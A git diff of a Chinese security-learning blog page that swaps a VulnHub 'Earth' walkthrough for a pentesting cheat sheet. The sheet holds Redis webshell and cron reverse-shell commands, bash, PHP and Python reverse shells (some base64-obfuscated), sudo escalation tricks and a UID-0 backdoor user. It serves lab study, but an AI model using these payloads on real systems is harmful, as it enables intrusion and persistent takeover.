@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/06/07/earth/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/06/08/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/06/07/earth/" class="post-title-link" itemprop="url">earth</a>
+          <a href="/2023/06/08/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" class="post-title-link" itemprop="url">常见知识点汇总</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-06-07 16:29:26" itemprop="dateCreated datePublished" datetime="2023-06-07T16:29:26+08:00">2023-06-07</time>
+      <time title="创建时间：2023-06-08 16:00:33" itemprop="dateCreated datePublished" datetime="2023-06-08T16:00:33+08:00">2023-06-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -247,12 +247,12 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
+          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
         </span>
     </span>
 
   
-    <span id="/2023/06/07/earth/" class="post-meta-item leancloud_visitors" data-flag-title="earth" title="阅读次数">
+    <span id="/2023/06/08/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" class="post-meta-item leancloud_visitors" data-flag-title="常见知识点汇总" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.4k</span>
+      <span>11k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>10 分钟</span>
     </span>
 </div>
 
@@ -283,79 +283,309 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先获取IP地址，使用<code>sudo arp-scan -I eth0 -l</code></p>
-<p><img src="/images/earth/image-20230607163117126.png"></p>
-<p>然后使用nmap获取端口信息，<code>nmap -sC -sV -p 1-10000 -o result.txt 10.0.2.7</code></p>
-<p>访问<code>10.0.2.7</code>发现会显示Bad Request</p>
-<p><img src="/images/earth/image-20230607163417473.png"></p>
-<p>然后扫描发现443端口有DNS解析</p>
-<p><img src="/images/earth/image-20230607164733990.png"></p>
-<p>将其加入hosts文件中，可以成功解析</p>
-<p><img src="/images/earth/image-20230607163621518.png"></p>
-<p>使用<code>https://terratest.earth.local/</code>和<code>http://terratest.earth.local/</code>分别访问（其他师傅是分别访问主域名和子域名）</p>
-<p><img src="/images/earth/image-20230607163745111.png"></p>
-<p><img src="/images/earth/image-20230607163754493.png"></p>
-<p>然后使用<code>dirsearch</code>扫描发现了一些文件信息</p>
-<p><img src="/images/earth/image-20230607163853592.png"></p>
-<p><img src="/images/earth/image-20230607164029240.png"></p>
-<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>访问<code>robots.txt</code>发现了一些信息，<code>testingnotes.*</code>文件经过测试发现是<code>testingnotes.txt</code>，然后进行访问</p>
-<p><img src="/images/earth/image-20230607164119875.png"></p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br></pre></td></tr></table></figure>
+          <h2 id="kali常见自带路径"><a href="#kali常见自带路径" class="headerlink" title="kali常见自带路径"></a>kali常见自带路径</h2><ul>
+<li>字典字典：<code>/usr/share/wordlists/</code></li>
+</ul>
+<h2 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h2><ul>
+<li>禁用&#x2F;启用网卡：<code>ifconfig [NIC_NAME] Down/Up</code></li>
+</ul>
+<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><ul>
+<li>-a：自动登录</li>
+<li>-c：不读取用户的.telnetrc文件</li>
+<li>-d：打开debug开关</li>
+<li>-e：使用char作为转义字符</li>
+<li>-E：不使用转义字符</li>
+<li>-l：参试以user身份自动登录</li>
+<li>-L：使用8位数据传输仅用于输出</li>
+<li>-n：将跟踪的信息记录到FILE中</li>
+<li>-r：使用类似于rlogin的用户界面</li>
+<li>常见用法：<ul>
+<li>telnet <code>IP地址</code></li>
+<li>telnet -l <code>用户名</code> <code>IP地址</code></li>
+</ul>
+</li>
+<li>注意事项：<ul>
+<li>root用户名可以用空密码通过telnet登录到目标</li>
+</ul>
+</li>
+</ul>
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><ul>
+<li>常见用法：<ul>
+<li><code>ftp IP地址</code></li>
+</ul>
+</li>
+<li>注意事项：<ul>
+<li>常见用户名和密码：<code>anonymous/任意密码</code></li>
+</ul>
+</li>
+<li>其他知识点：<ul>
+<li>FTP的安全版本是<code>SFTP</code></li>
+<li>FTP登录成功的响应代码是<code>230</code></li>
+<li>登录FTP下载文件的命令是<code>get</code></li>
+<li>上传文件的命令是<code>put</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><ul>
+<li>全称：<code>Server Message Block</code></li>
+<li>运行端口：<code>445</code></li>
+<li>nmap通常扫描出来得到的服务名为：<code>microsoft-ds</code></li>
+</ul>
+<h3 id="smbclient工具使用教程"><a href="#smbclient工具使用教程" class="headerlink" title="smbclient工具使用教程"></a>smbclient工具使用教程</h3><ul>
+<li>列出某个IP地址所提供的共享文件夹：<code>smbclient -L 198.168.0.1 [-U username%password]</code><ul>
+<li>Remote Admin：远程管理</li>
+<li>Default share：默认分享</li>
+<li>Remote IPC：远程IPC</li>
+</ul>
+</li>
+<li>像FTP客户端一样使用smbclient：<code>smbclient //192.168.0.1/tmp [-U username%password]</code></li>
+<li>直接使用一次性命令：<code>smbclient -c &quot;ls&quot;  //192.168.0.1/tmp [-U username%password]</code></li>
+<li>如果用户共享&#x2F;&#x2F;192.168.0.1&#x2F;tmp的方式是只读的，会提示<code>NT_STATUS_ACCESS_DENIED making remote directory /share1</code>，此时就可以使用<code>smbclient -c &quot;mkdir /share1&quot;  //192.168.0.1/tmp [-U username%password]</code>解决</li>
+</ul>
+<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><ul>
+<li>运行端口：6379</li>
+<li>连接Redis：<code>redis-cli -h host -p port -a password</code></li>
+<li>常用命令(未授权访问)：<ul>
+<li>查看信息：<code>info</code></li>
+<li>删除所有数据库内容：<code>flushable</code></li>
+<li>刷新数据库：<code>flush</code></li>
+<li>选择数据库：<code>select number</code>，例如：<code>select 1</code></li>
+<li>看所有键：<code>KEYS *</code>，使用<code>select nun</code>可以查看键值数据，例如：<code>keys *</code></li>
+<li>设置变量：<code>set test &quot;who am i</code></li>
+<li>查看变量值：<code>get 变量/键值</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="redis写入webshell"><a href="#redis写入webshell" class="headerlink" title="redis写入webshell"></a>redis写入webshell</h3><ul>
+<li>切换目录到网站的根目录：<code>config set dir /var/www/html/</code></li>
+<li>写入恶意代码：<code>set x &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</code></li>
+<li>写入一句话木马：<code>set xx &quot;\n\n\n&lt;?php @eval($_REQUEST[8]);?&gt;\n\n\n&quot;</code></li>
+<li>磁盘中生成木马文件shell.php：<code>config set dbfilename shell.php</code></li>
+<li>进行保存：<code>save</code></li>
+</ul>
+<h3 id="redis秘钥登录SSH"><a href="#redis秘钥登录SSH" class="headerlink" title="redis秘钥登录SSH"></a>redis秘钥登录SSH</h3><p>略</p>
+<h3 id="redis利用计划任务进行反弹shell"><a href="#redis利用计划任务进行反弹shell" class="headerlink" title="redis利用计划任务进行反弹shell"></a>redis利用计划任务进行反弹shell</h3><ul>
+<li>开启监听：<code>nc -lvnp 7777</code></li>
+<li>写入计划任务：<code>set xx &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.175.161/7777 0&gt;&amp;1\n&quot;</code></li>
+<li>设置导出的路径：<code>config set dir /var/spool/cron/</code></li>
+<li>设置导出的文件名：<code>config set dbfilename root</code></li>
+<li>保存：<code>save</code></li>
+</ul>
+<h2 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h2><h3 id="常用命令行选项："><a href="#常用命令行选项：" class="headerlink" title="常用命令行选项："></a>常用命令行选项：</h3><ul>
+<li>-fw：使用通配符结果强制处理域</li>
+<li>-np：隐藏进度输出</li>
+<li>-m &lt;mode&gt;：使用哪种模式，dir（默认）或者dns</li>
+<li>-q：禁用横幅&#x2F;下划线输出</li>
+<li>-t &lt;threads&gt;：要运行的线程数，默认10</li>
+<li>-u &lt;url&#x2F;domain&gt;：完整URL或者基本域名</li>
+<li>-v：详细输出，显示所有结果</li>
+<li>-w &lt;wordlist&gt;：设置字典</li>
+</ul>
+<h4 id="dns模式的命令选项："><a href="#dns模式的命令选项：" class="headerlink" title="dns模式的命令选项："></a>dns模式的命令选项：</h4><ul>
+<li>-cn：显示CNAME记录，不能与<code>-i</code>选项一起使用</li>
+<li>-i：显示结果的所有IP地址</li>
+</ul>
+<h4 id="dir模式的命令选项："><a href="#dir模式的命令选项：" class="headerlink" title="dir模式的命令选项："></a>dir模式的命令选项：</h4><ul>
+<li>-a &lt;user agent string&gt;：指定要在请求标头中发送的用户代理字符串</li>
+<li>-c &lt;http cookie&gt;：指定cookie</li>
+<li>-e：指定呈现完整URL的扩展模式</li>
+<li>-f：附加&#x2F;目录暴力</li>
+<li>-k：跳出SSL证书的验证</li>
+<li>-l：显示响应的长度</li>
+<li>-n：无状态模式，禁用结果状态代码的输出</li>
+<li>-o &lt;file&gt;：指定要将输出写入的文件名</li>
+<li>-p &lt;proxy url&gt;：指定用于所有请求的代理</li>
+<li>-r：重定向</li>
+<li>-s &lt;status code&gt;：指定状态码</li>
+<li>-x &lt;extensions&gt;：要检查的扩展名列表</li>
+<li>-P &lt;password&gt;：http授权密码</li>
+<li>-U &lt;username&gt;：http授权用户名</li>
+<li>-to &lt;timeout&gt;：http超时，默认10s，示例：10s</li>
+</ul>
+<h2 id="vol取证"><a href="#vol取证" class="headerlink" title="vol取证"></a>vol取证</h2><ul>
+<li>查看镜像的配置文件：<code>imageinfo</code>，eg：<code>./volatility -f 1.raw imageinfo</code></li>
+<li>指定配置：<code>--profile=指定镜像</code></li>
+<li>查看进程：<code>pslist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 pslist</code></li>
+<li>提取进程文件：<code>memdump</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 memdump -p 4272 --dump-dir=./</code><ul>
+<li><code>-p</code>：指定进程号</li>
+<li><code>--dump-dir</code>：指定存储文件的位置</li>
+</ul>
+</li>
+<li>查看桌面的情况：<code>filescan|grep Desktop</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 filescan |grep Desktop</code>，<code>filescan</code>的作用是扫描文件，然后可以搭配<code>grep</code>进行使用</li>
+<li>使用偏移量导出文件：<code>dumpfiles</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000002a2897e0 -D ./</code><ul>
+<li><code>-Q</code>：指定偏移量</li>
+<li><code>-D</code>：存储文件的文件夹</li>
+</ul>
+</li>
+<li>列出cmd命令：<ul>
+<li><code>cmdline</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 cmdline</code></li>
+<li><code>cmdscan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 cmdscan</code></li>
+</ul>
+</li>
+<li>列出进程列表：<ul>
+<li><code>psscan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 psscan</code></li>
+<li><code>pslist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 pslist</code></li>
+</ul>
+</li>
+<li>扫描建立的连接和套接字（类似于netstat）：<ul>
+<li><code>netscan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 netscan</code></li>
+</ul>
+</li>
+<li>扫描Windows服务列表：<ul>
+<li><code>svcscan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 svcscan</code></li>
+</ul>
+</li>
+<li>获取GDI的截图：<ul>
+<li><code>screenshot</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 screenshot --dump-dir=./</code></li>
+</ul>
+</li>
+<li>显示每个进程的加载dll列表：<ul>
+<li><code>dlllist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 dlllist</code></li>
+</ul>
+</li>
+<li>提取日志文件：<ul>
+<li><code>dumpregistry</code>，<code>./volatility -f 1.raw --profile=Win7SP1x64 dumpregistry --dump-dir=./</code></li>
+</ul>
+</li>
+<li>查看用户名密码信息：<ul>
+<li><code>hashdump</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 hashdump</code></li>
+</ul>
+</li>
+<li>查看浏览器历史记录：<ul>
+<li><code>idhistory</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 iehistory</code></li>
+</ul>
+</li>
+<li>查看文件：<ul>
+<li><code>filescan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 filescan</code></li>
+</ul>
+</li>
+<li>查看注册表配置单元：<ul>
+<li><code>hivelist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 hivelist</code></li>
+</ul>
+</li>
+<li>查看注册表键名：<ul>
+<li><code>hivedump</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 hivedump -o 0xfffff8a005fef010</code></li>
+</ul>
+</li>
+<li>查看注册表键值：<ul>
+<li><code>printkey</code>，eg：<code>./volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;xxxxxxx&quot;</code></li>
+</ul>
+</li>
+<li>查看运行程序相关的记录，比如最后一次更新的时间，运行的次数等等：<ul>
+<li><code>userassist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 userassist</code></li>
+</ul>
+</li>
+<li>最大程序提取信息：<ul>
+<li><code>timeliner</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 timeliner</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="常见反弹shell方式"><a href="#常见反弹shell方式" class="headerlink" title="常见反弹shell方式"></a>常见反弹shell方式</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ul>
+<li>php反弹shell：<code>php -r &#39;$sock=fsockopen(&quot;192.168.1.1&quot;,9001);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></li>
+<li>写入PHP一句话木马：<code>echo ZWNobyAnPD9waHAgQGV2YWwoJF9QT1NUWzhdKTsgPz4nID4gc2hlbGwucGhw | base64 -d | sh</code>，webshell：<code>&lt;?php @eval($_POST[8]); ?&gt;</code>[shell.php]</li>
+</ul>
+<h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h3><ul>
+<li>普通bash反弹shell：<code>bash -i &gt;&amp; /dev/tcp/10.0.2.15/7777 0&gt;&amp;1</code></li>
+<li>嵌套bash反弹shell：<code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNzc3NyAwJj4x&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></li>
+<li>绕过bash反弹shell：<ul>
+<li>先进行base64编码：<code>echo &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.5/9001 0&gt;&amp;1&quot; | base64</code></li>
+<li>然后嵌套：<code>echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNzc3NyAwPiYx&quot; | base64 -d|bash</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><h4 id="python升级shell"><a href="#python升级shell" class="headerlink" title="python升级shell"></a>python升级shell</h4><ul>
+<li><p>python升级shell，升级为pty-shell：<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，然后再<code>export TERM=xterm</code>，然后<code>Crtl+Z</code>将反弹shell置于后台，再使用<code>stty raw -echo;fg;reset</code>重新获取shell</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=xterm-256color</span><br><span class="line">export SHELL=/bin/bash</span><br><span class="line">stty size</span><br><span class="line">	这里的值是多少，最后的值也要修改为多少</span><br><span class="line">	</span><br><span class="line">使用Crtl+Z，然后输入下面的内容</span><br><span class="line">stty raw -echo;fg</span><br><span class="line">直接输入下面的内容</span><br><span class="line">	reset</span><br><span class="line">stty rows 0 columns 0</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h4><h5 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, subprocess, os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;10.0.2.15&quot;</span>,<span class="number">8888</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
 
-<p>访问<code>testdata.txt</code></p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
+<h5 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty,socket;s=socket.socket();s.connect((<span class="string">&quot;10.0.2.15&quot;</span>,<span class="number">9001</span>));[os.dup2(s.fileno(),f)<span class="keyword">for</span> f <span class="keyword">in</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p>根据意思进行解密：<br><img src="/images/earth/image-20230607164402194.png"></p>
-<blockquote>
-<p>key值：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty,socket</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;10.0.2.15&quot;</span>,<span class="number">9001</span>))</span><br><span class="line">[os.dup2(s.fileno(),f)<span class="keyword">for</span> f <span class="keyword">in</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)]</span><br><span class="line">pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><ul>
+<li>使用nc监听端口：<code>nc -lvnp 7777</code></li>
+<li>使用nc程序来传输二进制文件：<ul>
+<li>先在宿主机上运行：<code>nc -lp 9002 &gt; binFile</code>，binFile表示二进制文件</li>
+<li>然后在被监听的服务器上运行：<code>nc -w 3 you_ip[宿主机IP] 7778[Port] &lt; /usr/bin/binFile[二进制文件]</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="searchsploit的使用"><a href="#searchsploit的使用" class="headerlink" title="searchsploit的使用"></a>searchsploit的使用</h2><ul>
+<li>搜索内核版本：<code>searchsploit 4.4.0</code><br><img src="/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230606231153913.png" alt="image-20230606231153913"></li>
+</ul>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>参考文章：<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/260823.html">http://cn-sec.com/archives/260823.html</a></p>
+<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><ul>
+<li>查找SUID的二进制文件：<code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>
+</ul>
+<h3 id="vim提权"><a href="#vim提权" class="headerlink" title="vim提权"></a>vim提权</h3><ul>
+<li><code>sudo /usr/bin/vim -c &#39;:!/bin/sh&#39;</code></li>
+</ul>
+<h3 id="pip提权"><a href="#pip提权" class="headerlink" title="pip提权"></a>pip提权</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot;</span> &gt; $TF/setup.py</span><br><span class="line">sudo pip install $TF</span><br></pre></td></tr></table></figure>
+
+<h3 id="traitor"><a href="#traitor" class="headerlink" title="traitor"></a>traitor</h3><blockquote>
+<p>介绍</p>
 </blockquote>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">几乎所有的GTFOBins</span><br><span class="line">可写的docker.sock</span><br><span class="line">CVE-2022-0847（脏管）</span><br><span class="line">CVE-2021-4034（pwnkit）</span><br><span class="line">CVE-2021-3560</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/earth/image-20230607164452241.png"></p>
-<p>得到密码为<code>earthclimatechangebad4humans</code>，上面已知账号为<code>terra</code>，然后在<code>http://terratest.earth.local/admin/</code>中进行登录</p>
-<p>可以执行命令</p>
-<p><img src="/images/earth/image-20230607164609896.png"></p>
-<p>进行反弹shell</p>
-<blockquote>
-<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.2.15&#x2F;7777 0&amp;&gt;1</p>
+<h3 id="PEASS-ng"><a href="#PEASS-ng" class="headerlink" title="PEASS-ng"></a>PEASS-ng</h3><blockquote>
+<p>介绍</p>
 </blockquote>
-<p><img src="/images/earth/image-20230607164902017.png"></p>
-<p>发现没有反应，经过测试发现会过滤IP地址</p>
-<p><img src="/images/earth/image-20230607164949823.png"></p>
-<p>这里使用base64编码进行绕过</p>
-<blockquote>
-<p>echo “YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNzc3NyAwPiYx” | base64 -d|bash</p>
-</blockquote>
-<p><img src="/images/earth/image-20230607165122611.png"></p>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>查看是否有python的环境：<code>whereis python</code></p>
-<p><img src="/images/earth/image-20230607165238502.png"></p>
-<p>使用python获取更高级的shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=xterm</span><br><span class="line">然后使用Crtl+Z将反弹shell置于后台</span><br><span class="line">再使用	stty raw -echo;fg;reset	重新获取shell</span><br><span class="line">shell就成功升级了</span><br></pre></td></tr></table></figure>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">适用于 Windows 和 Linux/Unix* 以及 MacOS 的权限升级工具</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/earth/image-20230607165445357.png"></p>
-<p>使用<code>locate &quot;flag&quot;</code>成功获取第一个flag</p>
-<p><img src="/images/earth/image-20230607165543607.png"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>获取具有SUID的二进制文件</p>
-<p><img src="/images/earth/image-20230607165646016.png"></p>
-<p>但是无法进行运行</p>
-<p><img src="/images/earth/image-20230607165716134.png"></p>
-<p>缺少了什么东西，将其下载到本地，使用nc下载二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在本地运行：nc -lp 7778 &gt; reset_root</span><br><span class="line">然后在靶机运行：nc -w 3 10.0.2.15[宿主机IP] 7778 &lt; /usr/bin/reset_root</span><br></pre></td></tr></table></figure>
+<h2 id="ltrace工具"><a href="#ltrace工具" class="headerlink" title="ltrace工具"></a>ltrace工具</h2><ul>
+<li>功能：是一个简单的程序，它将执行二进制文件直到或除非它退出。它将告诉我们所有库调用并拦截二进制文件进行的系统调用。</li>
+</ul>
+<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><ul>
+<li>查找我们可以使用命令访问的文件：<code>find / -group administrators -type f 2&gt;/dev/null</code></li>
+</ul>
+<h2 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h2><ul>
+<li>压缩文件：<code>tar -czvf test.tar.gz test.txt</code></li>
+<li>解压文件：<code>tar -xzvf test.tar.gz</code></li>
+</ul>
+<h2 id="Linux添加用户命令"><a href="#Linux添加用户命令" class="headerlink" title="Linux添加用户命令"></a>Linux添加用户命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先添加用户：useradd -g root -s /bin/bash -u 10010 test</span><br><span class="line">将/etc/passwd中的UID修改为0：sed -i &quot;s/test:x:10010/test:x:0/g&quot; /etc/passwd</span><br><span class="line">给用户test设置一个密码：echo &quot;test:sd123456&quot; | chpasswd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/earth/image-20230607170024940.png"></p>
-<p><img src="/images/earth/image-20230607170037155.png"></p>
-<p>然后使用<code>ltrace</code>运行程序</p>
-<blockquote>
-<p>ltrace：一个简单的程序，它将执行二进制文件直到或除非它退出。它将告诉我们所有库调用并拦截二进制文件进行的系统调用</p>
